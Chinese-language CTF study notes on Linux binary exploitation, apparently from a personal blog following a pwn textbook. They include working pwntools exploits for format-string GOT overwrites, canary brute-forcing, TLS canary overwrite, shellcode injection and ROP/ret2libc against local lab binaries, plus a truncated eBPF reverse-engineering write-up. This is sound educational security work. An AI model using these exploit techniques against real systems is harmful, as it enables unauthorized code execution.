__libc_start_main@GLIBC_2.008049990 00000a07 R_386_JUMP_SLOT 00000000 putchar@GLIBC_2.0 1234567891011121314151617181920212223242526from pwn import *io = remote(&quot;127.0.0.1&quot;, 10001)context.log_level = &quot;debug&quot;def exec_fmt(payload): io.sendline(payload) info = io.recv() return infodef method_1(printf_addr): libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;) libc_addr = printf_addr - libc.symbols[&#x27;printf&#x27;] log.info(&quot;libc_addr: %#x&quot; % libc_addr) system_addr = libc_addr + libc.symbols[&#x27;system&#x27;] log.info(&quot;system_addr: %#x&quot; % system_addr) return system_addrprintf_got = 0x08049974payload = b&quot;%9$s.AAA&quot; + p32(printf_got)io.sendline(payload)data = io.recvuntil(b&#x27;.AAA&#x27;)[:4]printf_addr = u32(data)log.info(&quot;printf_addr: %#x&quot; % printf_addr)io.recvline()# 0xf7e2d520 可以得到printf的地址是0xf7e2d520 ，然后拿着这个地址和printf去Libc-database去搜，但是我没搜到。。。。 123456789101112╭─ ~/Desktop/testC/fmt_test ╰─ uname -aLinux ubuntu 5.4.0-104-generic #118~18.04.1-Ubuntu SMP Thu Mar 3 13:53:15 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux╭─ ~/Desktop/testC/fmt_test ╰─ ldd code.bin linux-gate.so.1 (0xf7fd5000) libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7ddc000) /lib/ld-linux.so.2 (0xf7fd6000)╭─ ~/Desktop/testC/fmt_test ╰─ ls -l /lib/i386-linux-gnu/libc.so.6lrwxrwxrwx 1 root root 12 1月 24 20:53 /lib/i386-linux-gnu/libc.so.6 -&gt; libc-2.27.so 我的虚拟机环境是这样 只能假设搜到了这个libc，然后再获取system的地址覆盖就OK了 EXP为： 12345678910111213141516171819202122232425262728293031323334353637from pwn import *io = remote(&quot;127.0.0.1&quot;, 10001)def exec_fmt(payload): io.sendline(payload) info = io.recv() return infodef method_1(printf_addr): libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;) libc_addr = printf_addr - libc.symbols[&#x27;printf&#x27;] log.info(&quot;libc_addr: %#x&quot; % libc_addr) system_addr = libc_addr + libc.symbols[&#x27;system&#x27;] log.info(&quot;system_addr: %#x&quot; % system_addr) return system_addrio.recvline()auto = FmtStr(exec_fmt)offset = auto.offsetprint(offset)printf_got = 0x08049974payload = b&quot;%9$s.AAA&quot; + p32(printf_got)io.sendline(payload)data = io.recvuntil(b&#x27;.AAA&#x27;)[:4]printf_addr = u32(data)log.info(&quot;printf_addr: %#x&quot; % printf_addr)io.recvline()system_addr = method_1(printf_addr)payload = fmtstr_payload(offset, &#123;printf_got: system_addr&#125;, write_size=&#x27;short&#x27;) # 这个地方要注意一下，题目限制了payload的长度，所以把write_size从byte改为short就可以缩短payload的长度log.info(&quot;len_payload : &quot; + str(len(payload)))print(payload)io.sendline(payload)io.recv()io.sendline(b&quot;/bin/sh&quot;)io.interactive() 方法二123456789101112131415161718192021222324252627282930313233343536from pwn import *from binascii import *io = remote(&quot;127.0.0.1&quot;, 10001)# context.log_level = &quot;debug&quot;def exec_fmt(payload): io.sendline(payload) info = io.recv() return infodef leak(addr): io.recvline() payload = b&#x27;%9$s.AAA&#x27; + p32(addr) io.sendline(payload) data = io.recvuntil(b&#x27;.AAA&#x27;)[:-4] + b&#x27;\\x00&#x27; # \\x00 字符串结尾 log.info(&#x27;leaking: &#123;0&#125;: &#123;1&#125;&#x27;.format(hex(addr), hexlify(data))) return dataprintf_got = 0x08049974# data = DynELF(leak, elf=ELF(&quot;./code.bin&quot;))data = DynELF(leak, 0x08048490)system_addr = data.lookup(&#x27;system&#x27;, &#x27;libc&#x27;)log.info(&quot;ststem_addr : &#123;&#125;&quot;.format(hex(system_addr)))payload = fmtstr_payload(7, &#123;printf_got: system_addr&#125;, write_size=&#x27;short&#x27;)log.info(&quot;len_payload : &quot; + str(len(payload)))print(payload)io.sendline(payload)io.recv()io.sendline(b&quot;/bin/sh&quot;)io.interactive()","categories":[{"name":"pwn学习","slug":"pwn学习","permalink":"https://zzzzsky.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://zzzzsky.github.io/tags/pwn/"},{"name":"读书笔记","slug":"读书笔记","permalink":"https://zzzzsky.github.io/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"《CTF竞赛权威指南-pwn篇》","slug":"《CTF竞赛权威指南-pwn篇》","permalink":"https://zzzzsky.github.io/tags/%E3%80%8ACTF%E7%AB%9E%E8%B5%9B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-pwn%E7%AF%87%E3%80%8B/"}]},{"title":"第8章_整数安全","slug":"第8章_整数安全","date":"2022-03-24T13:27:00.000Z","updated":"2022-03-24T13:33:44.046Z","comments":true,"path":"2022/03/24/第8章_整数安全/","link":"","permalink":"https://zzzzsky.github.io/2022/03/24/%E7%AC%AC8%E7%AB%A0_%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/","excerpt":"","text":"如果一个整数用来计算一些敏感数值，如缓冲区大小或数值索引等，就会存在潜在的危险，通常情况下，整数溢出并没有改写额外的内存，不会导致任意代码执行，但是它会导致栈溢出和堆溢出，而后两者会导致任意代码执行。 整数溢出异常情况主要是3种 溢出，只有有符号数才会发生溢出，溢出标志OF可检测有符号数的溢出 1234int i; i = INT_MAX; //2147483647i++;printf(&quot;i=%d\\n&quot;, i); // -2147483648 回绕，无符号数会发生回绕，溢出标志CF可检测无符号数的溢出 1234unsigned int ui;ui = UINT_MAX; //在x86-32上，为4294967295ui++;printf(&quot;ui=%d\\n&quot;, ui); //ui=0 截断，将较大宽度的数存入一个宽度小的操作数中，高位发生截断 1234567891011121314#include &lt;stdio.h&gt;int main()&#123; unsigned int a = 0xffffffff; unsigned int b = 1; unsigned int c = a + b; printf(&quot;%#x\\n&quot;, &amp;c); printf(&quot;%d&quot;, c); return 0;&#125;//0xffffd000//0 漏洞多发函数整数溢出要配合其他类型的缺陷才能够有用，下面的两个函数都有一个size_t类型的参数，尝尝被误用而造成整数溢出，接着就可能导致缓冲区溢出漏洞 123#include &lt;string.h&gt;void * memcpy(void * dest, const void * src, size_t n);char * strncpy(char * dest, const char * src, size_t n); 假设输入的n足够大，可能发生回绕，或者当n输入为负数的时候，这个地方可能把它解析为非常大的正数，导致溢出 整数溢出示例123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;string.h&gt;void check(char * passwd)&#123; char passwd_buf[11]; unsigned char passwd_len = strlen(passwd); if(passwd_len &gt;= 4 &amp;&amp; passwd_len &lt;= 8) &#123; printf(&quot;good!\\n&quot;); strcpy(passwd_buf, passwd); &#125;else&#123; printf(&quot;bad!\\n&quot;); &#125;&#125;int main(int argc, char * argv[])&#123; check(argv[1]); return 0;&#125; 将所有保护都关掉进行测试 1234567891011121314151617from pwn import *image_addr = 0x8048000libc_addr = 0xf7ddc000jmp_esp_addr = 0x00002b59 + libc_addr # jmp esp的地址shellcode = shellcraft.i386.linux.sh() payload = b&#x27;A&#x27; * 24 + p32(jmp_esp_addr) + asm(shellcode) # gdb调试用pattern测得eip偏移是24个字节print(len(payload))payload = payload.ljust(261, b&#x27;\\x01&#x27;) # 不能是\\x00，会被strlen截断print(len(payload))p = process(argv=[&#x27;./main&#x27;, payload])p.interactive()","categories":[{"name":"pwn学习","slug":"pwn学习","permalink":"https://zzzzsky.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://zzzzsky.github.io/tags/pwn/"},{"name":"读书笔记","slug":"读书笔记","permalink":"https://zzzzsky.github.io/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"《CTF竞赛权威指南-pwn篇》","slug":"《CTF竞赛权威指南-pwn篇》","permalink":"https://zzzzsky.github.io/tags/%E3%80%8ACTF%E7%AB%9E%E8%B5%9B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-pwn%E7%AF%87%E3%80%8B/"}]},{"title":"第4章_Linux安全机制","slug":"第4章_Linux安全机制","date":"2022-03-22T12:22:00.000Z","updated":"2022-03-22T12:24:41.867Z","comments":true,"path":"2022/03/22/第4章_Linux安全机制/","link":"","permalink":"https://zzzzsky.github.io/2022/03/22/%E7%AC%AC4%E7%AB%A0_Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/","excerpt":"","text":"Stack Canaries简介Stack Canaries 是一种对抗栈溢出攻击的技术，即SSP安全机制，有时也叫Stack cookies， 他是一个随机数，保存在栈上，比函数返回地址更低的位置，因为要想覆盖到返回地址，必然先覆盖到Canary，所以在函数返回前检查Canary是否变化，就可以达到保护栈的目的。 写程序测试 1234567#include &lt;stdio.h&gt;int main()&#123; char buf[10]; scanf(&quot;%s&quot;, buf); return 0;&#125; 1gcc -fstack-protector main.c -o main 运行，输入过长的字符，发现程序抛出异常stack smashing detected，表示检测到了栈溢出 12345╭─ ~/Desktop/testC ✔ ╰─ ./main 1111111111111111111111111111*** stack smashing detected ***: &lt;unknown&gt; terminated[1] 29048 abort (core dumped) ./main 反汇编看一下 123456789101112131415161718192021gef➤ disassemble mainDump of assembler code for function main: 0x00000000000006da &lt;+0&gt;: push rbp 0x00000000000006db &lt;+1&gt;: mov rbp,rsp 0x00000000000006de &lt;+4&gt;: sub rsp,0x20 0x00000000000006e2 &lt;+8&gt;: mov rax,QWORD PTR fs:0x28 ################ 0x00000000000006eb &lt;+17&gt;: mov QWORD PTR [rbp-0x8],rax ################ 0x00000000000006ef &lt;+21&gt;: xor eax,eax 0x00000000000006f1 &lt;+23&gt;: lea rax,[rbp-0x12] 0x00000000000006f5 &lt;+27&gt;: mov rsi,rax 0x00000000000006f8 &lt;+30&gt;: lea rdi,[rip+0xb5] # 0x7b4 0x00000000000006ff &lt;+37&gt;: mov eax,0x0 0x0000000000000704 &lt;+42&gt;: call 0x5b0 &lt;__isoc99_scanf@plt&gt; 0x0000000000000709 &lt;+47&gt;: mov eax,0x0 0x000000000000070e &lt;+52&gt;: mov rdx,QWORD PTR [rbp-0x8] ################ 0x0000000000000712 &lt;+56&gt;: xor rdx,QWORD PTR fs:0x28 ################ 0x000000000000071b &lt;+65&gt;: je 0x722 &lt;main+72&gt; ################ 0x000000000000071d &lt;+67&gt;: call 0x5a0 &lt;__stack_chk_fail@plt&gt; ################ 0x0000000000000722 &lt;+72&gt;: leave 0x0000000000000723 &lt;+73&gt;: ret End of assembler dump. 在Linux中，fs寄存器用来存TLS，而如果是64位程序，TLS字段偏移0x28的位置存放着stack_guard,程序先把他放到栈中，等函数运行完，在拿出fs:0x28和存放到栈中的那个stack_guard对比，如果不一样就会stack_chk_fail 攻击canaries主要有2中套路 将Canaries的值泄露出来 同时修改TLS和栈上的Canaries 泄露Canaries这里以NJCTF2017_messager题目为例 IDA打开分析，发现在函数400BE9中recv存在栈溢出漏洞，而400BC6的位置是将flag发送到客户端，所以我们的目的就是将返回地址覆盖为0x400BC6即可 重启服务器，canary就会变化，但是 这里采用的是，每连接一个客户端，就fork一个子程序，而子程序和服务器的canary是一样的，如果服务器不重启，fork的子程序的canary就不会变，所以可以采用爆破的方式 写EXP 123456789101112131415161718192021222324252627282930from pwn import *from Crypto.Util.number import *canary = b&#x27;\\x00&#x27;def leak_canary(): global canary while len(canary) &lt; 8: for x in range(256): io = remote(&quot;127.0.0.1&quot;, 5555) io.recv() # Welcome! payload = b&#x27;A&#x27;*104 + canary + long_to_bytes(x) # print(payload) io.send(payload) try: io.recv() canary = canary + long_to_bytes(x) break except: continue finally: io.close() print(f&quot;canary is &#123;canary&#125;&quot;)def pwn(): io = remote(&quot;127.0.0.1&quot;, 5555) io.recv() # Welcome! payload = b&#x27;A&#x27;*104 + canary + b&#x27;A&#x27; *8 + p64(0x400BC6) io.send(payload) print(io.recv())leak_canary()pwn() 在本地建个flag, 运行messager做一下测试 12345678910[+] Opening connection to 127.0.0.1 on port 5555: Done[*] Closed connection to 127.0.0.1 port 5555[+] Opening connection to 127.0.0.1 on port 5555: Done[*] Closed connection to 127.0.0.1 port 5555[+] Opening connection to 127.0.0.1 on port 5555: Done[*] Closed connection to 127.0.0.1 port 5555canary is b&#x27;\\x00&#125;\\xd90(\\x8b\\xd6\\x00&#x27;[+] Opening connection to 127.0.0.1 on port 5555: Doneb&#x27;flag&#123;niubiniubi&#125;\\n\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#x27;[*] Closed connection to 127.0.0.1 port 5555 https://e3pem.github.io/2018/09/30/NJCTF2017/题目原件可以从这里下载 覆盖TLS的canary在pthread_create创建的线程中,glibc就是在栈的高地址对TLS进行初始化，所以溢出足够多的数据就可以篡改tls中的那个canary https://dere.press/2020/10/18/glibc-tls/#fei-zhu-xian-cheng-qing-xing 这篇博客tls讲的很清楚 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;errno.h&gt;#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;#include &lt;asm/prctl.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void pwn_payload() &#123; char *argv[2] = &#123;&quot;/bin/sh&quot;, 0&#125;; execve(argv[0], argv, 0);&#125;int fixup = 0;void * first(void *x)&#123; unsigned long *addr; arch_prctl(ARCH_GET_FS, &amp;addr); printf(&quot;thread FS %p\\n&quot;, addr); printf(&quot;cookie thread: 0x%lx\\n&quot;, addr[5]); unsigned long * frame = __builtin_frame_address(0); printf(&quot;stack_cookie addr %p \\n&quot;, &amp;frame[-1]); printf(&quot;diff : %lx\\n&quot;, (char*)addr - (char*)&amp;frame[-1]); unsigned long len =(unsigned long)( (char*)addr - (char*)&amp;frame[-1]) + fixup; // example of exploitation // prepare exploit void *exploit = malloc(len); memset(exploit, 0x41, len); void *ptr = &amp;pwn_payload; memcpy((char*)exploit + 16, &amp;ptr, 8); // exact stack-buffer overflow example memcpy(&amp;frame[-1], exploit, len); return 0;&#125;int main(int argc, char **argv, char **envp)&#123; pthread_t one; unsigned long *addr; void *val; arch_prctl(ARCH_GET_FS, &amp;addr); if (argc &gt; 1) fixup = 0x30; printf(&quot;main FS %p\\n&quot;, addr); printf(&quot;cookie main: 0x%lx\\n&quot;, addr[5]); pthread_create(&amp;one, NULL, &amp;first, 0); pthread_join(one,&amp;val); return 0;&#125; 这是书上的一个例子，编译这个例子就可以看到偏移 IDA打开分析程序，可以发现存在栈溢出漏洞 checksec发现没有开PIE，但是开了NX，所以无法在栈中写代码了 思路就是利用ROP，执行puts，泄露出libc的地址，然后利用read，将one_gadget的地址写入进去，最后利用leave_ret调到one_gadget的地址去，getshell，在覆盖的时候要覆盖掉足够多的数据，将TLS的canary覆盖为和栈中的canary一样即可 1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *from Crypto.Util.number import *pop_rdi = 0x0400b73pop_rsi_r15 = 0x0400b71leave_ret = 0x004008a6bss_addr = 0x0602010context.log_level = &quot;debug&quot;bs = ELF(&quot;./bs&quot;)libc = ELF(&quot;./libc-2.27.so&quot;)io = process(&#x27;./bs&#x27;)payload = b&quot;\\x00&quot; * 0x1008payload += b&#x27;\\x00&#x27; * 8 # canarypayload += p64(bss_addr - 8) # Because pop rbp; ret; bss_addr is rbppayload += p64(pop_rdi) + p64(bs.got[&#x27;puts&#x27;]) # rdi = bs.got[&#x27;puts&#x27;]payload += p64(bs.plt[&#x27;puts&#x27;]) # puts(bs.got[&#x27;puts&#x27;]) # print puts addrpayload += p64(pop_rdi) + p64(0) # rdi = 0payload += p64(pop_rsi_r15) + p64(bss_addr) + p64(0) # rsi = bss_addr, r15 = 0payload += p64(bs.plt[&#x27;read&#x27;]) # read(0, bss_addr, ?)payload += p64(leave_ret)payload = payload.ljust(0x2000, b&#x27;\\x00&#x27;)io.sendlineafter(&quot;send?\\n&quot;, str(0x2000))io.send(payload)io.recvuntil(&quot;goodbye.\\n&quot;)addr_puts = io.recv(6).ljust(8, b&#x27;\\x00&#x27;)print(&quot;addr_puts: %#X&quot; % u64(addr_puts))libc_baseaddr = u64(addr_puts) - libc.symbols[&#x27;puts&#x27;]print(&quot;libc_baseaddr: %#X&quot; % libc_baseaddr)one_gadget_addr = libc_baseaddr + 0x4f302io.send(p64(one_gadget_addr))io.interactive() No-eXecuteNo-eXecute表示不可执行，其原理就是将数据所在的内存页，比如堆栈，标识为不可执行，如果程序产生溢出转入执行shellcode的时候，CPU就会抛出异常 1234567891011121314#include &lt;unistd.h&gt;void vuln_func()&#123; char buf[128]; read(STDIN_FILENO, buf, 256);&#125;int main()&#123; vuln_func(); write(STDOUT_FILENO, &quot;Hello world!\\n&quot;, 13); return 0;&#125; 未开启NX情况根据书上的代码试验下，为了防止其他因素干扰，先关闭canary和ASLR, 然后创建一个没有开启NX的程序 用shellcode攻击下看看，payload 填充 +ret(jmp esp的地址) + shellcode 的形式 1234567891011121314151617 ROPgadget --binary libc-2.27.so| grep &quot;jmp esp&quot; # 0x00189435 : adc bh, ch ; jmp esp .....# 运行gdb gef➤ x/10i 0xf7ddc000+0x189437 0xf7f65437: jmp esp 0xf7f65439: add DWORD PTR [ecx],0x0 0xf7f6543c: mov al,0x18 0xf7f6543e: out dx,eax 0xf7f6543f: (bad) 0xf7f65440: cld 0xf7f65441: test BYTE PTR [ecx],al 0xf7f65443: add BYTE PTR [eax-0x4b0010d8],dh 0xf7f65449: test DWORD PTR [ecx],eax 0xf7f6544b: add BYTE PTR [eax+0x29],ahgef➤ quit 123456789101112from pwn import *context.log_level=&quot;debug&quot;ret = 0xf7f65437 # jmp espshellcode = b&quot;\\x31\\xc9\\xf7\\xe1\\xb0\\x0b\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80&quot;payload = 140 * b&#x27;\\x00&#x27; + p32(ret) + shellcodeprint(payload)io = process(&quot;a.out&quot;)io.send(payload)io.interactive() 开启NX情况1gcc -m32 -fno-stack-protector -no-pie -z noexecstack main.c 开启NX后，之前的EXP就不好使了，此时我们自己注入的，放在栈上的shellcode就不可以执行了，但是我们可以用程序已有的代码 123456gef➤ p system$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e193d0 &lt;system&gt;gef➤ search-pattern &quot;/bin/sh&quot;[+] Searching &#x27;/bin/sh&#x27; in memory[+] In &#x27;/lib/i386-linux-gnu/libc-2.27.so&#x27;(0xf7ddc000-0xf7fb1000), permission=r-x 0xf7f5a1db - 0xf7f5a1e2 → &quot;/bin/sh&quot; 因为前面都关了ASLR，所以地址每次加载都不会变，直接执行system(“bin/sh”)即可 ASLR和PIE123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;dlfcn.h&gt;int main()&#123; int stack; int * heap = malloc(sizeof(int)); void * handle = dlopen(&quot;libc.so.6&quot;, RTLD_NOW | RTLD_GLOBAL); printf(&quot;executable: %p\\n&quot;, &amp;main); printf(&quot;system@plt: %p\\n&quot;, &amp;system); printf(&quot;heap: %p\\n&quot;, heap); printf(&quot;stack: %p\\n&quot;, &amp;stack); printf(&quot;libc: %p\\n&quot;, handle); free(heap); return 0;&#125; 关闭ASLR12echo 0 &gt; /proc/sys/kernel/randomize_va_spacegcc aslr.c -no-pie -fno-pie -ldl 可以发现，在关闭ASLR的时候，可以发现，除了stack有轻微的差距外，其他没有任何区别，每次执行都一样 部分开启ASLR1echo 1 &gt; /proc/sys/kernel/randomize_va_space 可以发现stack和libc的地址有显著变化，其他的不会变 完全开启ASLR1echo 2 &gt; /proc/sys/kernel/randomize_va_space 可以发现stack和libc的地址和heap有显著变化，其他的不会变 PIEASLR是一种操作系统层面的技术，二进制程序本身是不支持随机化加载的，人们在2003年引入了位置无关可执行文件（Position-Independent Executable, PIE）.，他是在应用层的编译器上实现的，通过将程序编译为位置无关代码（Position-Independent Code, PIC）,使程序可以被加载到任意位置，就像是一个特殊的共享库，但PIR也会在一定程度上影响性能，因此在大多数操作系统上PIE仅用于一些对安全性要求比较高的程序。 1gcc -pie -fpie aslr.c -ldl 可以发现所有地址全部随机（指起始位置，该对象内部依然是原来的结构，相对偏移是不会变的） 示例代码仍然为NX的那个例子 开启NX, ASLR, 关闭PIEexp为 123456789101112131415161718192021222324252627282930313233from pwn import *io = process(&quot;./nopie.out&quot;)nopie = ELF(&quot;./nopie.out&quot;)libc = ELF(&quot;./libc-2.27.so&quot;)vlun_func = 0x08048456payload1 = b&quot;A&quot; * 140 + p32(nopie.plt[&#x27;write&#x27;]) + p32(vlun_func) + p32(1) + p32(nopie.got[&#x27;write&#x27;])io.send(payload1)libc_addr = u32(io.recv(4)) - libc.symbols[&#x27;write&#x27;]print(hex(libc_addr))# system_addr = libc.symbols[&#x27;system&#x27;] + libc_addr# binsh_addr = 0x17E1DB + libc_addr# payload2 = b&quot;A&quot; * 140 + p32(system_addr)+p32(0) + p32(binsh_addr)# io.send(payload2)# io.interactive()pop_ebx = 0x080482e9one_gadget = 0x137eef + libc_addrlibc_got_addr = 0x01D8000 + libc_addrpayload2 = b&#x27;A&#x27; * 140 + p32(pop_ebx) + p32(libc_got_addr)payload2 += p32(one_gadget) + p32(0)# gdb.attach(io)# pause()io.send(payload2)io.interactive() 开启NX, ASLR, PIE这里修改下源代码测试，使其泄露出main函数地址,以便知道文件加载基地址 123456789101112131415#include &lt;unistd.h&gt;void vuln_func()&#123; char buf[128]; read(STDIN_FILENO, buf, 256);&#125;int main()&#123; printf(&quot;executable: %p\\n&quot;, &amp;main); vuln_func(); write(STDOUT_FILENO, &quot;Hello world!\\n&quot;, 13); return 0;&#125; 1234567891011121314151617181920212223242526272829from pwn import *pie_fpie = ELF(&quot;./pie_fpie.out&quot;)libc = ELF(&quot;./libc-2.27.so&quot;)io = process(&#x27;./pie_fpie.out&#x27;)io.recvuntil(&quot;executable: &quot;)main_addr_hex = io.recvuntil(&quot;\\n&quot;)[:-1].decode()main_addr_hex = int(main_addr_hex, 16)pie_fpie_baseaddr = main_addr_hex - pie_fpie.symbols[&#x27;main&#x27;]vuln_addr_offset = 0x57Dgot_offset = 0x1FD0 + pie_fpie_baseaddrpayload1 = b&quot;A&quot; * 132 +p32(got_offset) +b&#x27;A&#x27;*4 + p32(pie_fpie.plt[&#x27;write&#x27;] + pie_fpie_baseaddr) + p32(vuln_addr_offset + pie_fpie_baseaddr)+ p32(1) + p32(pie_fpie.got[&#x27;write&#x27;] + pie_fpie_baseaddr)io.send(payload1)write_addr = u32(io.recv(4))libc_addr = write_addr - libc.symbols[&#x27;write&#x27;]print(hex(libc_addr))binshaddr = libc_addr + next(libc.search(b&#x27;/bin/sh&#x27;))system_addr = libc_addr + libc.symbols[&#x27;system&#x27;]payload2 = b&#x27;A&#x27; * 140 + p32(system_addr) + p32(0) + p32(binshaddr)io.send(payload2)io.interactive() FORTIFY SOURCE这是一种针对危险函数的检查机制，在编译时尝试去确定风险是否存在，或者将危险函数替换为相对安全的函数实现，以大大降低缓冲区溢出发生的风险 -D_FORTIFY_SOURCE=1时，开启缓冲区溢出攻击检查 -D_FORTIFY_SOURCE=2时，开启缓冲区溢出以及格式化字符串攻击检查 用以下代码测试 1234567891011121314151617181920212223242526#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char *argv[])&#123; char buf1[10], buf2[10], *s; int num; memcpy(buf1, argv[1], 10); //safe strcpy(buf2, &quot;AAAABBBBC&quot;); printf(&quot;%s %s\\n&quot;, buf1, buf2); memcpy(buf1, argv[2], atoi(argv[3])); //unknown strcpy(buf2, argv[1]); printf(&quot;%s %s\\n&quot;, buf1, buf2); memcpy(buf1, argv[1], 11); //unsafe strcpy(buf2, &quot;AAAABBBBCC&quot;); s = fgets(buf1, 11, stdin); //fmt unknown printf(buf1, &amp;num); return 0;&#125; 编译时的安全检查1gcc -g -fno-stack-protector -O1 -D_FORTIFY_SOURCE=2 main.c -o fortify_chk 运行时的安全检查将unsafe的部分注释掉，重新编译 D_FORTIFY_SOURCE=01gcc -g -fno-stack-protector -O1 -D_FORTIFY_SOURCE=0 main.c -o fortify0 这个地方输入的argv[1] 可以导致buf2溢出，但是程序仍然可以正常运行 D_FORTIFY_SOURCE=11gcc -g -fno-stack-protector -O1 -D_FORTIFY_SOURCE=1 main.c -o fortify1 unknown部分被检测了出来，但是fmt unknown（%n, %5%x等）没有检测出来 D_FORTIFY_SOURCE=2 格式化字符串漏洞这里也被检测出来了 RELRORELRO(Relocation Read-Only)机制的提出就是为了解决延迟绑定的安全问题，它将符号重定向表设置为只读，或者再程序启动时就解析并绑定所有动态符号，从而避免GOT上的地址被篡改。 测试代码 1234567891011#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char * argv[])&#123; size_t * p = (size_t *)strtol(argv[1], NULL, 16); p[0] = 0x41414141; printf(&quot;RELRO: %x\\n&quot;, (unsigned int)*p); return 0;&#125; 将参数的地址改为.got 或 .got.plt等做测试 NO RELRO12345678gcc -z norelro -no-pie -fno-pie main.c -o relro_norelroreadelf -S relro_norelro ..... [21] .got PROGBITS 0000000000600910 00000910 0000000000000010 0000000000000008 WA 0 0 8 [22] .got.plt PROGBITS 0000000000600920 00000920 0000000000000028 0000000000000008 WA 0 0 8...... 测试程序，发现.got和.got.plt都是可写的 Partial RELRO12345678gcc -z lazy -no-pie -fno-pie main.c -o relro_lazyreadelf -S relro_lazy..... [21] .got PROGBITS 0000000000600ff0 00000ff0 0000000000000010 0000000000000008 WA 0 0 8 [22] .got.plt PROGBITS 0000000000601000 00001000 0000000000000028 0000000000000008 WA 0 0 8..... Full RELRO123456gcc -z now -no-pie -fno-pie main.c -o relro_now readelf -S relro_now..... [21] .got PROGBITS 0000000000600fc8 00000fc8 0000000000000038 0000000000000008 WA 0 0 8..... 在程序编译时开启Full RELRO ， .got.plt段就不需要了，在这种情况下，延迟绑定将被禁止。link_map和_dll_runtime_resolve的地址也不会被装入。开启Full RELRO会对程序启动时的性能造成一定的影响，但只有这样才能防止攻击者篡改GOT表","categories":[{"name":"pwn学习","slug":"pwn学习","permalink":"https://zzzzsky.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://zzzzsky.github.io/tags/pwn/"},{"name":"读书笔记","slug":"读书笔记","permalink":"https://zzzzsky.github.io/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"《CTF竞赛权威指南-pwn篇》","slug":"《CTF竞赛权威指南-pwn篇》","permalink":"https://zzzzsky.github.io/tags/%E3%80%8ACTF%E7%AB%9E%E8%B5%9B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-pwn%E7%AF%87%E3%80%8B/"}]},{"title":"2022_虎符CTF_部分RE_WP","slug":"2022虎符CTF_部分RE_WP","date":"2022-03-21T05:41:00.000Z","updated":"2022-03-21T05:54:50.183Z","comments":true,"path":"2022/03/21/2022虎符CTF_部分RE_WP/","link":"","permalink":"https://zzzzsky.github.io/2022/03/21/2022%E8%99%8E%E7%AC%A6CTF_%E9%83%A8%E5%88%86RE_WP/","excerpt":"","text":"fpbe根据知乎这篇文章 https://zhuanlan.zhihu.com/p/467647354作者在编写程序中 有用到fpbe.bpf.c这个源文件，而在这个文件中用到了BPF_KPROBE(uprobe)，这个函数就是在那个fpbe程序中的uprobed_function之前执行，但是BPF_KPROBE(uprobe) 是ebpf字节码形式的，IDA看不到，所以先binwalk提取出用ebpf字节码的那部分来，然后用llvm-objdump -d xxx.o 提取,就可以看到验证的函数了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899F4018.elf: file format ELF64-BPFDisassembly of section uprobe/func:uprobe: 0: 79 12 68 00 00 00 00 00 r2 = *(u64 *)(r1 + 104) 1: 67 02 00 00 20 00 00 00 r2 &lt;&lt;= 32 2: 77 02 00 00 20 00 00 00 r2 &gt;&gt;= 32 3: 79 13 70 00 00 00 00 00 r3 = *(u64 *)(r1 + 112) 4: 67 03 00 00 20 00 00 00 r3 &lt;&lt;= 32 5: 77 03 00 00 20 00 00 00 r3 &gt;&gt;= 32 6: bf 34 00 00 00 00 00 00 r4 = r3 7: 27 04 00 00 c0 6d 00 00 r4 *= 28096 8: bf 25 00 00 00 00 00 00 r5 = r2 9: 27 05 00 00 88 fb 00 00 r5 *= 64392 10: 0f 45 00 00 00 00 00 00 r5 += r4 11: 79 14 60 00 00 00 00 00 r4 = *(u64 *)(r1 + 96) 12: 67 04 00 00 20 00 00 00 r4 &lt;&lt;= 32 13: 77 04 00 00 20 00 00 00 r4 &gt;&gt;= 32 14: bf 40 00 00 00 00 00 00 r0 = r4 15: 27 00 00 00 fb 71 00 00 r0 *= 29179 16: 0f 05 00 00 00 00 00 00 r5 += r0 17: 79 11 58 00 00 00 00 00 r1 = *(u64 *)(r1 + 88) 18: b7 00 00 00 00 00 00 00 r0 = 0 19: 73 0a f8 